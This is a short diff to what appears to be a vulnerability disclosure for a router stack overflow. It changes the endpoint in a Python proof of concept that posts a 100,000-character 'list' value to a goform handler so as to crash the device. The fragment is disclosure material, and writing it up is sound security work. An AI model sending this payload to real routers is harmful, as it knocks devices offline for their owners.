@@ -26,7 +26,7 @@ Binary Vulnerability (Stack Overflow)
 Attackers can crash the router by sending a malicious request. Below is an example of the attack code:
 ```python  
 import requests
-url = "http://192.168.0.6/goform/SetNetControlList"
+url = "http://192.168.0.6/goform/ShutdownSetAdd"
 payload = {
     "list": 'A'*100000
 }
